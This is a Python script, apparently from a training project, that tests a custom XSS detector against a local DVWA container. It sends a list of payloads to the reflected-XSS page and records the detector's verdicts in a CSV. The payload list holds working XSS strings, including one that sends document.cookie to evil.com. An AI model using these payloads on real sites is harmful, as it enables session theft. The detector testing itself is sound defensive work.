"""
dvwa_integration.py  (Day 4)

Sends a set of payloads to DVWA's reflected-XSS page and, for each one,
shows side by side:
  - what the hybrid detector says (verdict / type / severity), and
  - whether DVWA reflected the payload back unescaped, i.e. whether the
    page really is exploitable with that input.

This is the "detector sits in front of a vulnerable app" demo: every payload
that DVWA reflects unescaped should be BLOCKed or FLAGged by the detector.
The detector only observes; it never modifies DVWA or attacks anything but
your own local container.

Prereqs (local only, never expose DVWA to a network):
    docker run --rm -it -p 8080:80 vulnerables/web-dvwa
    open http://localhost:8080, log in admin / password,
    click "Create / Reset Database", set DVWA Security to Low.

Run:
    python src/dvwa_integration.py                     # default http://localhost:8080
    python src/dvwa_integration.py --base http://localhost:8080
Writes: evidence/day4_dvwa_integration.csv
"""

import argparse
import csv
import re
import sys
from pathlib import Path

import requests

import anomaly_detector as anomaly
import detector

ROOT = Path(__file__).resolve().parent.parent
OUT = ROOT / "evidence" / "day4_dvwa_integration.csv"

PAYLOADS = [
    ("normal", "Rahul Kumar"),
    ("normal", "Meeting at 5pm with the team"),
    ("script_tag", "<script>alert(1)</script>"),
    ("event_handler", "<img src=x onerror=alert(1)>"),
    ("svg", "<svg onload=alert(1)>"),
    ("exfil", "<script>fetch('http://evil.com/?c='+document.cookie)</script>"),
    ("js_uri", "<a href=\"javascript:alert(1)\">click</a>"),
    ("rare_handler", "<div onclick=alert(1)>click"),
    ("no_rule", "';alert(String.fromCharCode(88,83,83))//"),
]


def token(html):
    m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([0-9a-f]+)['\"]", html)
    return m.group(1) if m else ""


def login(s, base):
    r = s.get(f"{base}/login.php", timeout=10)
    r = s.post(f"{base}/login.php", timeout=10, data={
        "username": "admin", "password": "password", "Login": "Login", "user_token": token(r.text)})
    if "login.php" in r.url and "Login failed" in r.text:
        sys.exit("Login failed. Check DVWA is running and the database was created.")
    # security level -> low
    r = s.get(f"{base}/security.php", timeout=10)
    s.post(f"{base}/security.php", timeout=10, data={
        "security": "low", "seclev_submit": "Submit", "user_token": token(r.text)})
    s.cookies.set("security", "low")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://localhost:8080")
    args = ap.parse_args()
    base = args.base.rstrip("/")

    model = anomaly.load_model()
    s = requests.Session()
    try:
        login(s, base)
    except requests.RequestException as e:
        sys.exit(f"Cannot reach DVWA at {base}: {e}")

    rows = []
    print(f"{'LABEL':<14} {'VERDICT':<7} {'SEV':<7} {'DVWA REFLECTED RAW':<19} PAYLOAD")
    for label, payload in PAYLOADS:
        result = detector.detect(payload, source_id="dvwa-test", target_field="xss_r:name", anomaly_model=model)
        r = s.get(f"{base}/vulnerabilities/xss_r/", params={"name": payload}, timeout=10)
        reflected_raw = payload in r.text   # present unescaped in the HTML response
        rows.append([label, payload, result["verdict"], result["attack_type"] or "",
                     result["severity"] or "", result["reason"], f"{result['anomaly_score']:+.3f}",
                     "yes" if reflected_raw else "no"])
        print(f"{label:<14} {result['verdict']:<7} {(result['severity'] or '-'):<7} "
              f"{('yes' if reflected_raw else 'no'):<19} {payload[:50]!r}")

    OUT.parent.mkdir(exist_ok=True)
    with open(OUT, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["label", "payload", "verdict", "attack_type", "severity", "reason",
                    "anomaly_score", "dvwa_reflected_raw"])
        w.writerows(rows)

    exploitable_unflagged = [r for r in rows if r[7] == "yes" and r[2] == "ALLOW" and r[0] != "normal"]
    print(f"\nWrote {OUT}")
    print("Exploitable payloads the detector ALLOWed:", len(exploitable_unflagged))


if __name__ == "__main__":
    main()
